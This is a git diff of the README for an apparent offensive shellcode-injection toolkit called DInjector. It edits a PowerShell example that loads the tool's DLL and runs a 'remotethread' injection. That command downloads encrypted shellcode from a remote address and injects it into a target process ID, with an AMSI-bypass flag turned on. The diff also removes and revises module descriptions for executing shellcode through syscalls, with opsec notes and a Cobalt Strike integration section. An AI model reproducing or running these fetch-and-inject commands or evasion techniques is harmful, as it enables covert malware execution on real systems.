@@ -75,9 +75,9 @@ Global arguments:
 Test it locally:
 
 ```powershell
-PS > $bytes = [System.IO.File]::ReadAllBytes("C:\DInjector.dll")
-PS > $assem = [System.Reflection.Assembly]::Load($bytes)
-PS > [DInjector.Detonator]::Boom("remotethread /sc:http://10.10.13.37/enc /password:Passw0rd! /pid:1337 /am51:True")
+$bytes = [System.IO.File]::ReadAllBytes("C:\DInjector.dll")
+$assem = [System.Reflection.Assembly]::Load($bytes)
+[DInjector.Detonator]::Boom("remotethread /sc:http://10.10.13.37/enc /password:Passw0rd! /pid:1337 /am51:True")
 ```
 
 ## Cobalt Strike Integration
@@ -130,19 +130,6 @@ references:
   - 'https://github.com/jhalon/SharpCall/blob/master/Syscalls.cs'
 ```
 
-### [MSILAddressLeak](/DInjector/Modules/MSILAddressLeak.cs)
-
-```yaml
-module_name: 'msiladdressleak'
-arguments:
-description: |
-  Leaks address of the shellcode byte array with MSIL and executes it like a function.
-api:
-opsec_safe: true
-references:
-  - 'https://github.com/PorLaCola25/TransactedSharpMiniDump/blob/master/SharpMiniDump/Msil.cs'
-```
-
 ### [ClipboardPointer](/DInjector/Modules/ClipboardPointer.cs)
 
 ```yaml
@@ -166,17 +153,22 @@ references:
 
 ```yaml
 module_name: 'currentthread'
-arguments:
+arguments: |
+  /timeout:10000
 description: |
   Injects shellcode into current process.
   Thread execution via NtCreateThreadEx.
 api:
+  - dynamic_invocation:
+    1: 'WaitForSingleObject'
   - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     3: 'NtCreateThreadEx'
-    4: 'NtWaitForSingleObject'
-    5: 'NtClose'
+    4: '[IF] NtProtectVirtualMemory (oldProtect)'
+    5: '[IF] NtFreeVirtualMemory (shellcode)'
+    6: '[ELSE] NtWaitForSingleObject'
+    7: 'NtClose'
 opsec_safe: false
 references:
   - 'https://github.com/XingYun-Cloud/D-Invoke-syscall/blob/main/Program.cs'
